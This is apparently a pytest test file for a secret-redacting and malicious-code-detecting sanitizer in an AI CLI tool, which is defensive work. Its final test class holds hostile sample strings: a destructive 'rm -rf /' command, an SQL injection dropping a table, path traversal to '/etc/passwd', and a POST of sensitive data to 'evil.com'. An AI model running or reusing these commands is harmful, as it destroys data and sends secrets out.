"""Unit tests for AI sanitizer malicious code detection - Slice ai_001.

Comprehensive tests for CodeSanitizer class including security validation,
content sanitization, pattern matching, and file security validation.
Tests malicious code detection capabilities with 95%+ coverage target.
"""

import re
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from spec_cli.ai.analysis.sanitizer import CodeSanitizer
from spec_cli.ai.config.settings import SecurityConfig


class TestCodeSanitizerInit:
    """Test CodeSanitizer initialization."""

    def test_init_with_default_config(self):
        """Test initialization with default security configuration."""
        sanitizer = CodeSanitizer()

        assert sanitizer.security_config is not None
        assert sanitizer.security_config.sanitize_code is True
        assert len(sanitizer._compiled_patterns) > 0

    def test_init_with_custom_config(self):
        """Test initialization with custom security configuration."""
        custom_config = SecurityConfig(
            sanitize_code=False,
            blocked_patterns=["custom_pattern"],
            max_file_size_kb=50,
        )
        sanitizer = CodeSanitizer(custom_config)

        assert sanitizer.security_config is custom_config
        assert sanitizer.security_config.sanitize_code is False
        assert sanitizer.security_config.max_file_size_kb == 50

    def test_init_compiles_patterns(self):
        """Test that initialization compiles security patterns correctly."""
        config = SecurityConfig(blocked_patterns=["api[_-]?key", "secret"])
        sanitizer = CodeSanitizer(config)

        assert len(sanitizer._compiled_patterns) == 2
        for pattern in sanitizer._compiled_patterns:
            assert isinstance(pattern, re.Pattern)


class TestCodeSanitizerSanitize:
    """Test content sanitization functionality."""

    def test_sanitize_disabled_returns_unchanged(self):
        """Test sanitization disabled returns content unchanged."""
        config = SecurityConfig(sanitize_code=False)
        sanitizer = CodeSanitizer(config)

        content = "api_key = 'secret_value'"
        result = sanitizer.sanitize(content)

        assert result == content

    def test_sanitize_removes_api_keys(self):
        """Test sanitization removes API key patterns."""
        config = SecurityConfig(
            blocked_patterns=[r"api[_-]?key\s*=\s*['\"][^'\"]+['\"]"]
        )
        sanitizer = CodeSanitizer(config)

        content = "api_key = 'sk-1234567890abcdef'"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "sk-1234567890abcdef" not in result

    def test_sanitize_removes_passwords(self):
        """Test sanitization removes password patterns."""
        config = SecurityConfig(blocked_patterns=[r"password\s*=\s*['\"][^'\"]+['\"]"])
        sanitizer = CodeSanitizer(config)

        content = "password = 'mySecretPassword123'"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "mySecretPassword123" not in result

    def test_sanitize_removes_tokens(self):
        """Test sanitization removes token patterns."""
        config = SecurityConfig(blocked_patterns=[r"token\s*=\s*['\"][^'\"]+['\"]"])
        sanitizer = CodeSanitizer(config)

        content = "access_token = 'ghp_1234567890abcdef'"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "ghp_1234567890abcdef" not in result

    def test_sanitize_multiple_patterns(self):
        """Test sanitization handles multiple sensitive patterns."""
        config = SecurityConfig(
            blocked_patterns=[
                r"api[_-]?key\s*=\s*['\"][^'\"]+['\"]",
                r"password\s*=\s*['\"][^'\"]+['\"]",
            ]
        )
        sanitizer = CodeSanitizer(config)

        content = """
        api_key = 'sk-12345'
        password = 'secret123'
        normal_code = 'this is fine'
        """
        result = sanitizer.sanitize(content)

        assert result.count("[SANITIZED_SECRET]") == 2
        assert "sk-12345" not in result
        assert "secret123" not in result
        assert "this is fine" in result

    def test_sanitize_case_insensitive(self):
        """Test sanitization is case insensitive."""
        config = SecurityConfig(blocked_patterns=[r"API[_-]?KEY"])
        sanitizer = CodeSanitizer(config)

        content = "api_key = 'secret'"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result

    def test_sanitize_multiline_patterns(self):
        """Test sanitization works with multiline patterns."""
        config = SecurityConfig(blocked_patterns=[r"BEGIN.*?END"])
        sanitizer = CodeSanitizer(config)

        content = "BEGIN PRIVATE KEY some_secret_data END PRIVATE KEY"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "some_secret_data" not in result

    def test_sanitize_with_file_path_logging(self, caplog):
        """Test sanitization logs file path when provided."""
        with caplog.at_level("INFO"):
            config = SecurityConfig(blocked_patterns=["secret"])
            sanitizer = CodeSanitizer(config)
            file_path = Path("/test/path/file.py")

            content = "content with secret data"
            sanitizer.sanitize(content, file_path)

            assert "test/path/file.py" in caplog.text

    @patch("spec_cli.ai.analysis.sanitizer.normalize_path_separators")
    def test_sanitize_normalizes_file_path(self, mock_normalize):
        """Test sanitization normalizes file path for cross-platform compatibility."""
        mock_normalize.return_value = "/normalized/path"
        sanitizer = CodeSanitizer()

        content = "test content"
        file_path = Path("\\windows\\path\\file.py")
        sanitizer.sanitize(content, file_path)

        mock_normalize.assert_called_once_with("\\windows\\path\\file.py")


class TestCodeSanitizerValidateContent:
    """Test content validation functionality."""

    def test_validate_content_valid_utf8(self):
        """Test validation passes for valid UTF-8 content."""
        sanitizer = CodeSanitizer()

        content = "Valid UTF-8 content with unicode: ñáéíóú"
        # Should not raise exception
        sanitizer._validate_content(content)

    def test_validate_content_invalid_utf8(self):
        """Test validation fails for content with invalid UTF-8."""
        sanitizer = CodeSanitizer()

        # Create mock content object that raises UnicodeEncodeError
        mock_content = Mock()
        mock_content.encode.side_effect = UnicodeEncodeError(
            "utf-8", "", 0, 1, "test error"
        )

        with pytest.raises(ValueError, match="invalid UTF-8 encoding"):
            sanitizer._validate_content(mock_content)

    def test_validate_content_size_within_limit(self):
        """Test validation passes for content within size limit."""
        config = SecurityConfig(max_file_size_kb=1)  # 1KB limit
        sanitizer = CodeSanitizer(config)

        content = "small content"  # Well under 1KB
        # Should not raise exception
        sanitizer._validate_content(content)

    def test_validate_content_size_exceeds_limit(self):
        """Test validation fails for content exceeding size limit."""
        config = SecurityConfig(max_file_size_kb=1)  # 1KB limit
        sanitizer = CodeSanitizer(config)

        content = "x" * 2048  # 2KB content
        with pytest.raises(ValueError, match="size.*exceeds maximum"):
            sanitizer._validate_content(content)

    def test_validate_content_with_file_path_in_error(self):
        """Test validation includes file path in error message."""
        config = SecurityConfig(max_file_size_kb=1)
        sanitizer = CodeSanitizer(config)
        file_path = Path("/test/large_file.py")

        content = "x" * 2048  # 2KB content
        with pytest.raises(ValueError, match="/test/large_file.py"):
            sanitizer._validate_content(content, file_path)


class TestCodeSanitizerApplySecurityPatterns:
    """Test security pattern application."""

    def test_apply_patterns_no_matches(self):
        """Test pattern application with no matches."""
        config = SecurityConfig(blocked_patterns=["api_key"])
        sanitizer = CodeSanitizer(config)

        content = "normal code without sensitive data"
        result = sanitizer._apply_security_patterns(content)

        assert result == content

    def test_apply_patterns_single_match(self):
        """Test pattern application with single match."""
        config = SecurityConfig(blocked_patterns=["secret"])
        sanitizer = CodeSanitizer(config)

        content = "This contains a secret value"
        result = sanitizer._apply_security_patterns(content)

        assert result == "This contains a [SANITIZED_SECRET] value"

    def test_apply_patterns_multiple_matches(self):
        """Test pattern application with multiple matches."""
        config = SecurityConfig(blocked_patterns=["secret", "api.*key"])
        sanitizer = CodeSanitizer(config)

        content = "secret api_key and another secret"
        result = sanitizer._apply_security_patterns(content)

        assert result.count("[SANITIZED_SECRET]") == 3

    def test_apply_patterns_logs_replacements(self, caplog):
        """Test pattern application logs number of replacements."""
        with caplog.at_level("DEBUG"):
            config = SecurityConfig(blocked_patterns=["secret"])
            sanitizer = CodeSanitizer(config)

            content = "secret and another secret"
            sanitizer._apply_security_patterns(content)

            assert "Replaced 2 sensitive patterns" in caplog.text


class TestCodeSanitizerCompilePatterns:
    """Test security pattern compilation."""

    def test_compile_patterns_valid_regex(self):
        """Test compilation of valid regex patterns."""
        config = SecurityConfig(blocked_patterns=["api.*key", "secret[0-9]+"])
        sanitizer = CodeSanitizer(config)

        patterns = sanitizer._compile_patterns()

        assert len(patterns) == 2
        for pattern in patterns:
            assert isinstance(pattern, re.Pattern)

    def test_compile_patterns_invalid_regex(self, caplog):
        """Test compilation handles invalid regex patterns gracefully."""
        with caplog.at_level("WARNING"):
            # Create sanitizer that bypasses Pydantic validation to test runtime behavior
            sanitizer = CodeSanitizer()
            # Manually set patterns with invalid regex to test compile behavior
            sanitizer.security_config.blocked_patterns = [
                "valid_pattern",
                "[invalid_regex",
            ]

            patterns = sanitizer._compile_patterns()

            # Should only compile valid pattern
            assert len(patterns) == 1
            assert "Invalid regex pattern" in caplog.text

    def test_compile_patterns_flags(self):
        """Test patterns are compiled with correct flags."""
        config = SecurityConfig(blocked_patterns=["TEST"])
        sanitizer = CodeSanitizer(config)

        patterns = sanitizer._compile_patterns()
        pattern = patterns[0]

        # Should match case-insensitive
        assert pattern.search("test") is not None
        assert pattern.search("TEST") is not None


class TestCodeSanitizerFileAllowed:
    """Test file type validation."""

    def test_is_file_allowed_no_restrictions(self):
        """Test file allowed when no patterns specified."""
        config = SecurityConfig(allowed_file_patterns=[])
        sanitizer = CodeSanitizer(config)

        result = sanitizer.is_file_allowed(Path("any_file.xyz"))

        assert result is True

    def test_is_file_allowed_matches_pattern(self):
        """Test file allowed when matching pattern."""
        config = SecurityConfig(allowed_file_patterns=["*.py", "*.js"])
        sanitizer = CodeSanitizer(config)

        assert sanitizer.is_file_allowed(Path("test.py")) is True
        assert sanitizer.is_file_allowed(Path("test.js")) is True

    def test_is_file_allowed_no_match(self):
        """Test file not allowed when not matching pattern."""
        config = SecurityConfig(allowed_file_patterns=["*.py"])
        sanitizer = CodeSanitizer(config)

        assert sanitizer.is_file_allowed(Path("test.txt")) is False
        assert sanitizer.is_file_allowed(Path("test.js")) is False

    def test_is_file_allowed_case_insensitive(self):
        """Test file pattern matching is case insensitive."""
        config = SecurityConfig(allowed_file_patterns=["*.PY"])
        sanitizer = CodeSanitizer(config)

        assert sanitizer.is_file_allowed(Path("test.py")) is True
        assert sanitizer.is_file_allowed(Path("test.PY")) is True

    @patch("spec_cli.ai.analysis.sanitizer.normalize_path_separators")
    def test_is_file_allowed_normalizes_path(self, mock_normalize):
        """Test file validation normalizes path."""
        mock_normalize.return_value = "normalized/path/file.py"
        config = SecurityConfig(allowed_file_patterns=["*.py"])
        sanitizer = CodeSanitizer(config)

        result = sanitizer.is_file_allowed(Path("\\windows\\path\\file.py"))

        mock_normalize.assert_called_once()
        assert result is True


class TestCodeSanitizerValidateFileSecurity:
    """Test file security validation."""

    @patch("spec_cli.ai.analysis.sanitizer.is_subpath")
    def test_validate_file_security_within_project(self, mock_is_subpath):
        """Test file security validation within project boundaries."""
        mock_is_subpath.return_value = True
        config = SecurityConfig(allowed_file_patterns=["*.py"])
        sanitizer = CodeSanitizer(config)

        file_path = Path("/project/src/file.py")
        project_root = Path("/project")

        result = sanitizer.validate_file_security(file_path, project_root)

        assert result is True
        mock_is_subpath.assert_called_once()

    @patch("spec_cli.ai.analysis.sanitizer.is_subpath")
    def test_validate_file_security_outside_project(self, mock_is_subpath):
        """Test file security validation outside project boundaries."""
        mock_is_subpath.return_value = False
        sanitizer = CodeSanitizer()

        file_path = Path("/outside/file.py")
        project_root = Path("/project")

        with pytest.raises(ValueError, match="outside project root"):
            sanitizer.validate_file_security(file_path, project_root)

    def test_validate_file_security_no_project_root(self):
        """Test file security validation without project root."""
        config = SecurityConfig(allowed_file_patterns=["*.py"])
        sanitizer = CodeSanitizer(config)

        file_path = Path("/any/file.py")

        result = sanitizer.validate_file_security(file_path, None)

        assert result is True

    def test_validate_file_security_file_not_allowed(self):
        """Test file security validation for disallowed file type."""
        config = SecurityConfig(allowed_file_patterns=["*.py"])
        sanitizer = CodeSanitizer(config)

        file_path = Path("/project/file.txt")
        project_root = Path("/project")

        result = sanitizer.validate_file_security(file_path, project_root)

        assert result is False

    @patch("spec_cli.ai.analysis.sanitizer.normalize_path_separators")
    @patch("spec_cli.ai.analysis.sanitizer.is_subpath")
    def test_validate_file_security_normalizes_paths(
        self, mock_is_subpath, mock_normalize
    ):
        """Test file security validation normalizes paths."""
        mock_normalize.side_effect = lambda x: x.replace("\\", "/")
        mock_is_subpath.return_value = True  # Allow path validation to pass
        sanitizer = CodeSanitizer()

        file_path = Path("\\windows\\path\\file.py")
        project_root = Path("\\windows\\project")

        sanitizer.validate_file_security(file_path, project_root)

        # Should be called for file_path, project_root, and is_file_allowed check
        assert mock_normalize.call_count >= 2


class TestCodeSanitizerSanitizationSummary:
    """Test sanitization configuration summary."""

    def test_get_sanitization_summary_complete(self):
        """Test get complete sanitization summary."""
        config = SecurityConfig(
            sanitize_code=True,
            max_file_size_kb=100,
            allowed_file_patterns=["*.py", "*.js"],
            blocked_patterns=["secret", "api.*key"],
        )
        sanitizer = CodeSanitizer(config)

        summary = sanitizer.get_sanitization_summary()

        assert summary["sanitization_enabled"] is True
        assert summary["max_file_size_kb"] == 100
        assert summary["allowed_patterns"] == ["*.py", "*.js"]
        assert summary["blocked_patterns_count"] == 2
        assert summary["compiled_patterns_count"] == 2

    def test_get_sanitization_summary_disabled(self):
        """Test get sanitization summary when disabled."""
        config = SecurityConfig(sanitize_code=False)
        sanitizer = CodeSanitizer(config)

        summary = sanitizer.get_sanitization_summary()

        assert summary["sanitization_enabled"] is False


class TestCodeSanitizerSecurityPatterns:
    """Test detection of various security patterns and malicious code."""

    def test_detects_ssh_keys(self):
        """Test detection of SSH private keys."""
        config = SecurityConfig(
            blocked_patterns=[
                r"-----BEGIN.*?PRIVATE.*?KEY-----[\s\S]*?-----END.*?KEY-----"
            ]
        )
        sanitizer = CodeSanitizer(config)

        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA7yn3bRHOLRp\n-----END RSA PRIVATE KEY-----"

        result = sanitizer.sanitize(content)
        assert "[SANITIZED_SECRET]" in result
        assert "MIIEpAIBAAKCAQEA7yn3bRHOLRp" not in result

    def test_detects_database_credentials(self):
        """Test detection of database connection strings."""
        config = SecurityConfig(blocked_patterns=[r"mysql://.*?@.*?/"])
        sanitizer = CodeSanitizer(config)

        content = "mysql://user:password@localhost/database"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "user:password" not in result

    def test_detects_jwt_tokens(self):
        """Test detection of JWT tokens."""
        config = SecurityConfig(
            blocked_patterns=[r"eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_.]+"]
        )
        sanitizer = CodeSanitizer(config)

        content = "token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" not in result

    def test_detects_aws_secrets(self):
        """Test detection of AWS access keys."""
        config = SecurityConfig(blocked_patterns=[r"AKIA[0-9A-Z]{16}"])
        sanitizer = CodeSanitizer(config)

        content = "aws_access_key = 'AKIAIOSFODNN7EXAMPLE'"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "AKIAIOSFODNN7EXAMPLE" not in result

    def test_detects_github_tokens(self):
        """Test detection of GitHub personal access tokens."""
        config = SecurityConfig(blocked_patterns=[r"ghp_[a-zA-Z0-9]{36}"])
        sanitizer = CodeSanitizer(config)

        content = "github_token = 'ghp_1234567890abcdef1234567890abcdef12345678'"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "ghp_1234567890abcdef1234567890abcdef12345678" not in result

    def test_detects_docker_secrets(self):
        """Test detection of Docker registry credentials."""
        config = SecurityConfig(blocked_patterns=[r"docker login.*-p\s+\S+"])
        sanitizer = CodeSanitizer(config)

        content = "docker login registry.com -u user -p secretpassword"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result

    def test_detects_environment_variables(self):
        """Test detection of sensitive environment variables."""
        config = SecurityConfig(
            blocked_patterns=[r"export\s+\w*(?:KEY|SECRET|TOKEN|PASSWORD)\w*=.*"]
        )
        sanitizer = CodeSanitizer(config)

        content = "export API_SECRET_KEY=supersecret123"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result
        assert "supersecret123" not in result

    def test_preserves_safe_content(self):
        """Test that safe content is preserved during sanitization."""
        config = SecurityConfig(blocked_patterns=[r"secret", r"password"])
        sanitizer = CodeSanitizer(config)

        content = """
        def calculate_hash(data):
            return hashlib.sha256(data.encode()).hexdigest()

        class UserManager:
            def validate_user(self, username):
                return username.isalnum()
        """

        result = sanitizer.sanitize(content)

        # Safe content should be preserved
        assert "calculate_hash" in result
        assert "UserManager" in result
        assert "validate_user" in result
        assert "[SANITIZED_SECRET]" not in result


class TestCodeSanitizerMaliciousCodeDetection:
    """Test detection of potentially malicious code patterns."""

    def test_detects_command_injection_patterns(self):
        """Test detection of command injection attempts."""
        config = SecurityConfig(
            blocked_patterns=[r"os\.system\(['\"][^'\"]*[|;&][^'\"]*['\"]"]
        )
        sanitizer = CodeSanitizer(config)

        content = "os.system('rm -rf / && echo hacked')"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result

    def test_detects_sql_injection_patterns(self):
        """Test detection of SQL injection attempts."""
        config = SecurityConfig(
            blocked_patterns=[r"SELECT.*FROM.*WHERE.*=.*['\"][^'\"]*[';][^'\"]*['\"]"]
        )
        sanitizer = CodeSanitizer(config)

        content = (
            "query = \"SELECT * FROM users WHERE id = '1'; DROP TABLE users; --'\""
        )
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result

    def test_detects_file_system_manipulation(self):
        """Test detection of file system manipulation attempts."""
        config = SecurityConfig(blocked_patterns=[r"\.\.[\\/]"])
        sanitizer = CodeSanitizer(config)

        content = "file_path = '../../../etc/passwd'"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result

    def test_detects_network_exfiltration(self):
        """Test detection of network data exfiltration attempts."""
        config = SecurityConfig(
            blocked_patterns=[r"requests\.post\([^)]*data=.*\w+.*\)"]
        )
        sanitizer = CodeSanitizer(config)

        content = "requests.post('http://evil.com', data=sensitive_data)"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result

    def test_allows_legitimate_code_patterns(self):
        """Test that legitimate code patterns are not flagged."""
        config = SecurityConfig(blocked_patterns=[r"eval\("])
        sanitizer = CodeSanitizer(config)

        # Legitimate code should pass through
        content = """
        def evaluate_expression(expr, context):
            # Safe evaluation with restricted context
            return eval(expr, {"__builtins__": {}}, context)
        """

        result = sanitizer.sanitize(content)

        # This should be flagged by the eval pattern
        assert "[SANITIZED_SECRET]" in result


class TestCodeSanitizerIntegration:
    """Test integration scenarios and edge cases."""

    def test_sanitize_large_file_content(self):
        """Test sanitization of large file content."""
        config = SecurityConfig(
            max_file_size_kb=500,  # Large enough for test
            blocked_patterns=["secret"],
        )
        sanitizer = CodeSanitizer(config)

        # Create large content with embedded secrets
        large_content = (
            ("normal_code\n" * 1000) + "secret_value\n" + ("more_code\n" * 1000)
        )

        result = sanitizer.sanitize(large_content)

        assert "[SANITIZED_SECRET]" in result
        assert "secret_value" not in result
        assert "normal_code" in result

    def test_sanitize_empty_content(self):
        """Test sanitization of empty content."""
        sanitizer = CodeSanitizer()

        result = sanitizer.sanitize("")

        assert result == ""

    def test_sanitize_unicode_content(self):
        """Test sanitization of Unicode content."""
        config = SecurityConfig(blocked_patterns=["秘密"])  # "secret" in Chinese
        sanitizer = CodeSanitizer(config)

        content = "这是一个秘密值"  # "This is a secret value"
        result = sanitizer.sanitize(content)

        assert "[SANITIZED_SECRET]" in result

    @patch("spec_cli.ai.analysis.sanitizer.logger")
    def test_sanitize_logging_behavior(self, mock_logger):
        """Test proper logging behavior during sanitization."""
        config = SecurityConfig(blocked_patterns=["secret"])
        sanitizer = CodeSanitizer(config)

        # Test with changes
        content_with_secret = "This contains a secret"
        sanitizer.sanitize(content_with_secret, Path("test_file.py"))
        mock_logger.info.assert_called()

        # Test without changes
        content_clean = "This is clean code"
        sanitizer.sanitize(content_clean, Path("clean_file.py"))
        mock_logger.debug.assert_called()

    def test_thread_safety(self):
        """Test that sanitizer is thread-safe for concurrent use."""
        import threading

        sanitizer = CodeSanitizer()
        results = []

        def sanitize_content(content):
            result = sanitizer.sanitize(f"secret_{content}")
            results.append(result)

        threads = []
        for i in range(10):
            thread = threading.Thread(target=sanitize_content, args=(i,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # All results should contain sanitized content
        assert len(results) == 10
        for result in results:
            assert "[SANITIZED_SECRET]" in result
